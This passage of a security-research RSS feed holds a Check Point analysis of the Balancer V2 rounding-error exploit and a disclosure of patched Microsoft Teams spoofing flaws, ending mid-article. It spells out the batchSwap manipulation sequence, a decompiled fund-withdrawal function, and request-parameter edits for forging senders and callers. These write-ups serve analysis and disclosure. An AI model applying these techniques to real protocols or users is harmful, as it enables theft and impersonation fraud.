&lt;p&gt;&lt;code&gt;{&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;quot;domainname&amp;quot;: &amp;quot;applewood-artisans.com&amp;quot;,&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;quot;ip&amp;quot;: null,&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;quot;type&amp;quot;: null,&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;quot;firstseen&amp;quot;: &amp;quot;2025-11-04&amp;quot;,&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;quot;score&amp;quot;: 0,&lt;br /&gt;
&amp;nbsp; &amp;nbsp; &amp;quot;scorereason&amp;quot;: &amp;quot;High entropy: 3.57 (+0.36)&amp;quot;&lt;br /&gt;
&amp;nbsp; },&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;domainname:&lt;/strong&gt; The domain name&lt;br /&gt;
&lt;strong&gt;ip&lt;/strong&gt;: IPv4 address (if available)&lt;br /&gt;
&lt;strong&gt;type&lt;/strong&gt;: currently not used&lt;br /&gt;
&lt;strong&gt;firstseen&lt;/strong&gt;: Date the domain name was first seen&lt;br /&gt;
&lt;strong&gt;score&lt;/strong&gt;: The &amp;quot;anomaly score&amp;quot;&lt;br /&gt;
&lt;strong&gt;scorereason&lt;/strong&gt;: reason behind the score&lt;/p&gt;

&lt;p&gt;One of the sources of this data is the Certificate Transparency logs. It is possible that we will see new certificates for older domains that have not yet made it into our list of &amp;quot;existing&amp;quot; domains. As a result, you will see some older domains listed as &amp;quot;new&amp;quot; because they were not previously included in our feeds.&lt;/p&gt;

&lt;p&gt;Regarding all our data: Use it at your own risk. The data is provided on a best-effort basis at no cost. Commercial use is permitted as long as the data is attributed to us and not resold. We do not recommend using the data as a block list. Instead, use it to &amp;quot;add color to your logs&amp;quot;. The data may provide some useful context for other data you collect.&lt;/p&gt;

&lt;p&gt;Why do we have a somewhat unusual API, rather than a more standard-compliant REST, GraphQL, or even SOAP API? Well, the API predates these standards (except for SOAP... and do you really want me to use SOAP?). At one point, we may offer something closer to whatever the REST standard will look like at the time, but don't hold your breath; there are a few other projects I want to complete first.&lt;/p&gt;

&lt;p&gt;Feedback and bug reports are always welcome.&lt;/p&gt;

&lt;p&gt;On November 3, 2025, Check Point Research&amp;#8217;s blockchain monitoring systems detected a sophisticated exploit targeting Balancer V2&amp;#8217;s ComposableStablePool contracts. The attacker exploited arithmetic precision loss in pool invariant calculations to drain &lt;strong&gt;$128.64 million&lt;/strong&gt; across six blockchain networks in under 30 minutes.&lt;/p&gt;



&lt;p&gt;The attack leveraged a rounding error vulnerability in the _upscaleArray function that, when combined with carefully crafted batchSwap operations, allowed the attacker to artificially suppress BPT (Balancer Pool Token) prices and extract value through repeated arbitrage cycles. The exploitation occurred primarily during attacker smart contract deployment, with the constructor executing 65+ micro-swaps that compounded precision loss to devastating effect.&lt;/p&gt;

&lt;p&gt;In the early morning hours of November 3, 2025, Check Point&amp;#8217;s Blockchain Threat Analysis system flagged unusual activity on the Ethereum mainnet involving Balancer&amp;#8217;s V2 Vault contract. Within minutes, our automated detection identified a critical exploit in progress, with massive fund outflows from multiple liquidity pools.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Balancer V2" class="wp-image-32207" height="366" src="https://research.checkpoint.com/wp-content/uploads/2025/11/balancer-v2-1-1090px-1024x366.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;The attack exploited a mathematical vulnerability in how Balancer&amp;#8217;s ComposableStablePools handle small-value swaps. When token balances are pushed to specific rounding boundaries (8-9 wei range), Solidity&amp;#8217;s integer division causes significant precision loss. The attacker weaponized this by executing batched swap sequences that accumulated these tiny errors into catastrophic invariant manipulation.&lt;/p&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Background: Balancer V2 Architecture&lt;/strong&gt;&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;The Vault System&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Balancer V2 uses a centralized &amp;#8220;Vault&amp;#8221; contract (0xBA12222222228d8Ba445958a75a0704d566BF2C8) that holds all tokens across all pools, separating token storage from pool logic to reduce gas costs and enable capital efficiency. This shared liquidity design meant a single vulnerability in pool math could affect all ComposableStablePools simultaneously—exactly what happened in this attack.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;Internal Balance Mechanism&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Balancer V2&amp;#8217;s Internal Balance system allows users to deposit tokens once and use them across multiple operations without repeated ERC20 transfers:&lt;/p&gt;



&lt;pre class="wp-block-code"&gt;&lt;code&gt;mapping(address =&gt; mapping(IERC20 =&gt; uint256)) private _internalTokenBalance;&lt;/code&gt;&lt;/pre&gt;



&lt;p&gt;This system became critical to the attack. The exploit contract accumulated stolen funds in its internal balance during deployment, then withdrew them to the final recipient address in subsequent transactions.&lt;/p&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;The Vulnerability: Arithmetic Precision Loss in Stable Pool Math&lt;/strong&gt;&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;The Root Cause&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;ComposableStablePools use Curve&amp;#8217;s StableSwap invariant formula to maintain price stability between similar assets. The invariant D represents total pool value, and BPT price is calculated as D divided by totalSupply. However, the scaling operations that prepare balances for invariant calculations introduce rounding errors.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;Vulnerable Code Path:&lt;/strong&gt;&lt;/h3&gt;



&lt;pre class="wp-block-code"&gt;&lt;code&gt;function _upscaleArray(uint256&amp;#91;] memory amounts, uint256&amp;#91;] memory scalingFactors) 
    private pure returns (uint256&amp;#91;] memory) {
    
    for (uint256 i = 0; i &amp;lt; amounts.length; i++) {
        amounts&amp;#91;i] = FixedPoint.mulDown(amounts&amp;#91;i], scalingFactors&amp;#91;i]);
    }
    return amounts;
}
// Simplified representation - actual implementation is more complex
function _calculateInvariant(uint256&amp;#91;] memory balances) private pure returns (uint256) {
    uint256&amp;#91;] memory scaledBalances = _upscaleArray(balances, scalingFactors);
    uint256 invariant = computeStableInvariant(scaledBalances, amplificationParameter);
    return invariant;
}
&lt;/code&gt;&lt;/pre&gt;



&lt;p&gt;The mulDown function performs integer division that rounds down. When balances are small (8-9 wei range), this rounding creates significant relative errors—up to 10% precision loss per operation.&lt;/p&gt;



&lt;p&gt;This precision error propagates to the invariant D calculation, causing abnormal reduction in the calculated value. Since BPT price equals D divided by total supply, the reduced D directly lowers BPT price, creating arbitrage opportunities for the attacker.&lt;/p&gt;



&lt;p&gt;Individual swaps produce negligible precision loss, but within a single batchSwap transaction containing 65 operations, these losses compound dramatically. The lack of invariant change validation allowed the attacker to systematically suppress BPT price through accumulated precision errors, extracting millions in value per pool&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Attack Analysis&lt;/strong&gt;&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;The Three&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;strong&gt;Phase Pattern&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;The attacker executed a sophisticated three-stage swap sequence within single `batchSwap` transactions:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Stage 1: Adjustment to Rounding Boundary&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Swap large amounts of BPT for underlying tokens to push one token&amp;#8217;s balance to the critical 8-9 wei threshold where rounding errors are maximized.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Stage 2: Trigger Precision Loss&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Execute small swaps involving the boundary-positioned token. The &lt;code&gt;_upscaleArray&lt;/code&gt; function rounds down during scaling, causing the invariant D to be underestimated and BPT price to drop artificially.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Stage 3: Extract Value&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Mint or purchase BPT at the suppressed price, then immediately redeem for underlying assets at full value. The price discrepancy represents pure profit.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;This three-phase cycle repeated 65 times within the same &lt;/strong&gt;&lt;code&gt;&lt;strong&gt;batchSwap&lt;/strong&gt;&lt;/code&gt;&lt;strong&gt; transaction.&lt;/strong&gt; All stages occur atomically, preventing intervention and ensuring precision losses accumulate across the shared balance state, ultimately extracting millions from each targeted pool.&lt;/p&gt;



&lt;p&gt;Having understood the vulnerability mechanism, let&amp;#8217;s examine how the attacker automated this exploitation.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Exploit Contract Architecture&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The attacker deployed contract `0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d` with a three-address operational structure:&lt;/p&gt;



&lt;p&gt;&amp;#8211; Exploiter 1: 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207 (deployer)&lt;/p&gt;



&lt;p&gt;&amp;#8211; Exploit Contract: 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d&lt;/p&gt;



&lt;p&gt;&amp;#8211; Exploiter 2: 0xAa760D53541d8390074c61DEFeaba314675b8e3f (recipient)&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Constructor-Based Attack&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Analysis of transaction 0x6ed07db&amp;#8230; revealed the theft occurred during contract deployment. The constructor automatically executed the rounding error exploitation, targeting two Balancer pools simultaneously.&lt;/p&gt;



&lt;p&gt;&amp;nbsp;The constructor generated 65 token transfers to Balancer&amp;#8217;s Protocol Fees Collector—these are swap fees collected during the manipulation, not the stolen funds themselves. The transfer amounts display the characteristic pattern of iterative precision exploitation, decreasing from 0.414 osETH down to 0.000000000000000003 osETH as the rounding errors compound to negligible values.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-32208" height="79" src="https://research.checkpoint.com/wp-content/uploads/2025/11/balancer-v2-2-1090px-1024x79.png" width="1024" /&gt;&lt;/figure&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-32209" height="107" src="https://research.checkpoint.com/wp-content/uploads/2025/11/balancer-v2-3-1090px-1024x107.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;The stolen value appears in InternalBalanceChanged events, which record balance updates within the Vault&amp;#8217;s internal accounting system. The exploit contract&amp;#8217;s internal balance increased by:&lt;/p&gt;



&lt;p&gt;Pool 1 (osETH/wETH-BPT): +4,623 WETH, +6,851 osETH&lt;br /&gt;Pool 2 (wstETH-WETH-BPT): +1,963 WETH, +4,259 wstETH&lt;br /&gt;&lt;strong&gt;Combined total: 6,586 WETH (4,623 + 1,963) + 6,851 osETH + 4,259 wstETH&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;These internal balance increases represent the actual stolen funds. The &lt;code&gt;InternalBalanceChanged&lt;/code&gt; events show that the exploit contract&amp;#8217;s Vault-internal account was credited with the drained assets. While the underlying tokens physically remained in the Vault contract, the Vault&amp;#8217;s accounting system now recognized the exploit contract as the owner of these balances, enabling later withdrawal.&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Withdrawal Function&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;After the constructor accumulated stolen funds, function 0x8a4f75d6 transferred them to Exploiter 2:&lt;/p&gt;



&lt;pre class="wp-block-code"&gt;&lt;code&gt;function 0x8a4f75d6(address&amp;#91;] calldata targetPools) public {
    require(msg.sender == _callTx);
    
    poolIndex = 0;
    while (poolIndex &amp;lt; targetPools.length) {
        poolId = targetPools&amp;#91;poolIndex].getPoolId();
        (tokens&amp;#91;],) = vault.getPoolTokens(poolId);
        internalBals&amp;#91;] = vault.getInternalBalance(address(this), tokens);
        
        tokenIndex = 0;
        while (tokenIndex &amp;lt; tokens.length) {
            operations&amp;#91;tokenIndex] = UserBalanceOp({
                kind: 1,
                asset: tokens&amp;#91;tokenIndex],
                amount: internalBals&amp;#91;tokenIndex],
                sender: address(this),
                recipient: 0xAa760D53541d8390074c61DEFeaba314675b8e3f
            });
            tokenIndex++;
        }
        
        vault.manageUserBalance(operations);
        poolIndex++;
    }
}
&lt;/code&gt;&lt;/pre&gt;



&lt;p&gt;This function withdraws the contract&amp;#8217;s own internal balance. The UserBalanceOp has sender equal to the exploit contract address because the contract legitimately owns the funds accumulated during constructor execution.&lt;/p&gt;



&lt;p&gt;Transaction `0xd155207&amp;#8230;` confirms this withdrawal transferred 6,586 WETH from the exploit contract&amp;#8217;s internal balance to Exploiter 2 address.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;The Two&lt;/strong&gt;&lt;strong&gt;&amp;#8211;&lt;/strong&gt;&lt;strong&gt;Stage Attack&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Stage 1 &amp;#8211; Theft (Constructor Execution):&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;TX: 0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742&lt;/p&gt;



&lt;p&gt;Action: Deploy exploit contract&lt;/p&gt;



&lt;p&gt;Method: Constructor executes batchSwap operations against two pools&lt;/p&gt;



&lt;p&gt;Result: $63M drained via rounding error, stored in contract&amp;#8217;s internal balance&lt;/p&gt;



&lt;p&gt;Evidence: 65 fee transfers + InternalBalanceChanged events showing +6,586 WETH, +6,851 osETH, +4,259 wstETH&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Stage 2 &amp;#8211; Extraction (Function Call):&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;TX: 0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569&lt;/p&gt;



&lt;p&gt;Action: Call function 0x8a4f75d6&lt;/p&gt;



&lt;p&gt;Method: Withdraw internal balance to Exploiter 2&lt;/p&gt;



&lt;p&gt;Result: Funds transferred to final recipient&lt;/p&gt;



&lt;p&gt;Evidence: manageUserBalance with sender = exploit contract&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The Balancer exploit demonstrates how mathematical vulnerabilities in DeFi protocols can be weaponized through automation and careful parameter tuning. The attacker&amp;#8217;s success stemmed from recognizing that negligible rounding errors become exploitable when amplified through dozens of operations in atomic transactions.&lt;/p&gt;



&lt;p&gt;Despite extensive audits, the vulnerability persisted because traditional testing focuses on individual operation correctness, not cumulative effects of adversarial batch operations. The industry must evolve toward continuous security validation, economic attack modeling, and adversarial testing that considers how tiny flaws compound into catastrophic exploits.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/microsoft-teams-impersonation-and-spoofing-vulnerabilities-exposed/"&gt;Exploiting Microsoft Teams: Impersonation and Spoofing Vulnerabilities Exposed&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;By Andrey Charikov and Oded Vanunu&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Key Findings:&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check Point Research uncovered four vulnerabilities in Microsoft Teams that allow attackers to impersonate executives, manipulate messages, alter notifications, and forge identities in video and audio calls.&lt;/li&gt;



&lt;li&gt;Both external guest users and malicious insiders could exploit these flaws, fundamentally breaking trust in a platform used by 320M+ people worldwide.&lt;/li&gt;



&lt;li&gt;Real-world risks include executive impersonation, financial fraud, malware delivery, misinformation campaigns, and disruption of sensitive communications.&lt;/li&gt;



&lt;li&gt;Check Point Research responsibly disclosed the vulnerabilities to Microsoft on March 23, 2024. Microsoft acknowledged the report, investigated, and subsequently issued fixes for the reported issues. By the end of October 2025, all vulnerabilities had been resolved, and Microsoft officially tracked one of them — the notification spoofing flaw — as CVE-2024-38197&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Launched in March 2017, Microsoft Teams has become one of the most widely used communication and collaboration platforms in the world. As part of the Microsoft 365 family, Teams provides workplaces with chat, video conferencing, file storage, and application integration to more than 320 million monthly active users. From the largest global enterprises to small and medium-sized businesses, Teams has become a critical backbone of modern workplace communication.&lt;/p&gt;



&lt;p&gt;Our research revealed a series of vulnerabilities in Teams that undermine those trusted communication channels. We found that both external guest users and malicious insiders can manipulate messages, impersonate executives, and even spoof notifications. In practice, this means an attacker could enter as a guest and convincingly appear to be the CEO, a fundamental breakdown of the trust that organizations rely on to operate securely.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;The Evolving Threat Landscape&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;In recent years, we&amp;#8217;ve witnessed sophisticated threat actors, including state-sponsored groups and nation-state actors, increasingly target collaboration platforms and communication tools as part of broader espionage and data exfiltration campaigns. These advanced persistent threat (APT) groups have demonstrated particular interest in:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Supply chain attacks&lt;/strong&gt;&amp;nbsp;targeting widely-used software platforms&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Social engineering&lt;/strong&gt;&amp;nbsp;campaigns leveraging trusted communication channels&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Business email compromise (BEC)&lt;/strong&gt;&amp;nbsp;attacks that exploit trust in familiar interfaces&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Credential harvesting&lt;/strong&gt;&amp;nbsp;operations targeting remote workforce tools&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Today, threat actors exploit the inherent trust users place in familiar communication and workspace interfaces, using social engineering tactics to manipulate employees through platforms organizations depend on for daily operations.&lt;/p&gt;



&lt;p&gt;Recent intelligence reports have highlighted how these threat actors specifically target remote work infrastructure, recognizing that communication platforms have become critical business infrastructure. Given this evolving threat landscape, Check Point Research set out to investigate potential&amp;nbsp;&lt;a href="https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/"&gt;security gaps in widely-used workspace tools&lt;/a&gt;. As part of this broader research initiative into these platforms, we examined Microsoft Teams to identify how its trust mechanisms could be subverted. The findings presented here highlight Teams as one example of a wider issue: the ways attackers can exploit trust in modern workspace tools.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Our Research Findings&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;We approached this research from two key attack perspectives: external guest users attempting to infiltrate organizations, and internal malicious users, such as compromised employees or insider threats, seeking to abuse their existing access.&lt;/p&gt;



&lt;p&gt;Our research revealed several vulnerabilities within Microsoft Teams that could be exploited to manipulate message content and sender identity, alter notification appearances. Most critically, we discovered that both external guest users and internal malicious actors can effectively transform their identity to appear as trusted personnel, including C-level executives, fundamentally breaking the trust boundaries that organizations rely on for secure communication.&lt;/p&gt;



&lt;p&gt;These findings are significant, demonstrating not just theoretical risks but practical loopholes that could be used for misinformation, impersonation, and privacy breaches. Whether starting as an external guest user or operating as a malicious insider, an attacker could seamlessly transition to appearing as a trusted authority figure, potentially fooling employees into believing they&amp;#8217;re communicating with their CEO, finance director, or other high-authority figures.&lt;/p&gt;



&lt;p&gt;Specifically, we were able to:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Edit Messages Without Trace:&lt;/strong&gt;&amp;nbsp;We discovered a method to alter the content of sent messages without leaving the usual &amp;#8220;Edited&amp;#8221; label.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Manipulate Messages Notifications:&lt;/strong&gt;&amp;nbsp;Our research uncovered a technique to change the apparent sender of a message, enabling the display of notifications, for example, from high-profile individuals like CEOs, thus exploiting the trust and urgency typically associated with such communications.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Altering Display Names via Conversation Topics in Private Chats:&lt;/strong&gt;&amp;nbsp;We identified a vulnerability that allows an attacker to change the displayed name in private chat conversations by modifying the conversation topic. Both participants see the altered topic as the conversation name, potentially misleading them about the conversation&amp;#8217;s context.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Forge Caller Identity in Video/Audio Calls&lt;/strong&gt;&lt;br /&gt;We discovered that the display name used in call notifications (and later on during call itself) could be arbitrarily modified through specific manipulations of call initiation requests. This flaw allows an attacker to forge the caller identity, presenting any chosen name to the call recipient.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Together, these vulnerabilities show how attackers can erode the fundamental trust that makes collaboration workspace tools effective, turning Teams from a business enabler into a vector for deception.&lt;/p&gt;



&lt;p&gt;Microsoft had&amp;nbsp;&lt;a href="https://windowsforum.com/threads/cve-2024-38197-critical-spoofing-vulnerability-in-microsoft-teams-for-ios.341797/"&gt;previously disclosed CVE-2024-38197&lt;/a&gt;&amp;nbsp;as a medium-severity spoofing issue in Microsoft Teams for iOS, noting that earlier client versions did not properly validate message sender fields and could therefore misrepresent user identity in limited cases. Our research expands on those findings by demonstrating a more impactful exploitation path: we developed a proof-of-concept showing how a malicious bot or webhook could craft payloads with falsified “from” attributes that rendered convincingly as trusted users within the Teams interface. This amplification highlights not only the practical risk of targeted impersonation but also the broader need for stricter validation controls across Teams clients.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Technical Deep Dive&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;While Microsoft Teams offers both web and application versions that function similarly, we focused our research on the web version. This version, like its app counterpart, accepts and processes JSON payloads for various actions, such as sending messages and making calls.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Understanding Teams Messaging Architecture&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;When a message is dispatched, several parameters are included in the request body:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32178" height="207" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image1.png" width="422" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;content&lt;/strong&gt;: The actual text of the message surrounded by HTML tags&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;messagetype&lt;/strong&gt;: For standard text messages, this is typically set to RichText/Html. However, this parameter changes to reflect the specific action being performed for other actions like adding a new user or initiating a new conversation.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;clientmessageid&lt;/strong&gt;: A unique identifier for each user&amp;#8217;s message, ensuring that each message can be individually tracked and managed.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;imdisplayname&lt;/strong&gt;: The display name of the user who sent the message, allowing recipients to see who the message is from.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Upon sending a POST request, the response includes the&amp;nbsp;&lt;strong&gt;OriginalArrivalTime&lt;/strong&gt;&amp;nbsp;parameter, which carries a Unix timestamp value, which is crucial for operations that modify the message post-send, such as editing, deleting, or quoting our own or someone else&amp;#8217;s messages.&lt;/p&gt;



&lt;p&gt;Moreover, another key piece of information obtained is the unique UUID assigned to every user. It can be found by fetch conversation of specific user or his messages whether from private or group chat:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32180" height="203" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image2.png" width="939" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;This UUID (from above screenshot it starts with 8:orgid:37f85325) is essential for identifying users within the system and plays a significant role in the vulnerabilities we will explore.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Message Manipulation Techniques&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Let&amp;#8217;s begin with the basics and explore what modifications we can make to our own messages. As previously mentioned, when we send a message, we include a&amp;nbsp;&lt;strong&gt;clientmessageid&lt;/strong&gt;&amp;nbsp;parameter (along with the content of our message) and receive a Unix timestamp value for the&amp;nbsp;&lt;strong&gt;OriginalArrivalTime&lt;/strong&gt;&amp;nbsp;parameter:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32181" height="200" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image3.png" width="940" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;OriginalArrivalTime&lt;/strong&gt;: 1709414616944&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;clientmessageid&lt;/strong&gt;: 2711247313308716623&lt;/p&gt;



&lt;p&gt;Upon retrieving our entire chat history, we can observe these values:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32182" height="318" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image4.png" width="940" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Now, let&amp;#8217;s attempt to edit our message directly within MS Teams. Unfortunately, this action results in an &amp;#8220;Edited&amp;#8221; label appearing above our message. To bypass this, we can craft a new message and replace the&amp;nbsp;&lt;strong&gt;clientmessageid&lt;/strong&gt;&amp;nbsp;with the value from our previous message &amp;#8211;&amp;nbsp;&lt;strong&gt;2711247313308716623&lt;/strong&gt;. This approach effectively masks our edit, making it undetectable to others.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Manipulating Notifications&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Whether on a phone app or a PC, these alerts draw our immediate attention, especially when they signal messages from key figures within an organization. For instance, receiving a notification that implies a message is from the CEO or another high-ranking official inherently demands a higher level of urgency and importance. This psychological effect is what makes notifications not just informative but influential.&lt;/p&gt;



&lt;p&gt;Within each message sent, there&amp;#8217;s a parameter called&amp;nbsp;&lt;strong&gt;imdisplayname&lt;/strong&gt;, which, by default, displays the sender&amp;#8217;s name:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32183" height="196" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image5.png" width="537" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Through our investigation, we&amp;#8217;ve found that this parameter can be altered to any desired value. This manipulation results in the recipient receiving a notification that appears to come from someone other than the actual sender:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32184" height="262" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image6.png" width="525" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Result:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32189" height="527" src="https://research.checkpoint.com/wp-content/uploads/2025/11/image7.jpeg" width="894" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Altering Display Names in Private Chats&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Microsoft Teams provides functionality to update the conversation topic in group chats through a specific PUT endpoint. This feature is designed to help users organize and identify their chats more efficiently.&lt;/p&gt;



&lt;p&gt;PUT /api/chatsvc/emea/v1/threads/&amp;lt;Conversation ID&amp;gt;/properties?name=topic&lt;/p&gt;



&lt;p&gt;By manipulating the request to this endpoint, it&amp;#8217;s possible to alter the conversation topic not just in group chats, where such changes are expected and allowed, but surprisingly, in private conversations as well.&lt;/p&gt;



&lt;p&gt;In case of private chat—a direct conversation between two individuals—any change to the topic should ideally be restricted or not applicable, given the nature of private chats not having a &amp;#8216;topic&amp;#8217; in the conventional sense.&lt;/p&gt;



&lt;p&gt;Before:&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-32185" height="132" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image8.png" width="558" /&gt;&lt;/figure&gt;



&lt;p&gt;After:&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-32186" height="142" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image9.png" width="553" /&gt;&lt;/figure&gt;



&lt;p&gt;Such a change, when executed, can mislead users into believing they are engaging in a conversation with a different person.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Forging Caller Identity in Video/Audio Calls&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;We discovered that the display name used in call notifications could be arbitrarily modified through specific manipulations of call initiation requests. This flaw allows an attacker to forge the caller identity, presenting any chosen name to the call recipient.&lt;/p&gt;



&lt;p&gt;During the call initiation phase, a JSON payload is sent to:&lt;/p&gt;



&lt;p&gt;POST /api/v2/epconv&lt;/p&gt;



&lt;p&gt;containing various parameters that define the call&amp;#8217;s characteristics. Among these, the &amp;#8220;displayName&amp;#8221; parameter within the &amp;#8220;participants&amp;#8221; section is of particular interest. This parameter is intended to display the name of the caller as it appears to the recipient.&lt;/p&gt;



&lt;p&gt;By modifying the &amp;#8220;displayName&amp;#8221; value in the payload, we were able to alter the apparent identity of the caller. For instance, changing it to an arbitrary name results in the call recipient seeing a call incoming from the modified name, instead of the actual caller&amp;#8217;s identity:&lt;/p&gt;



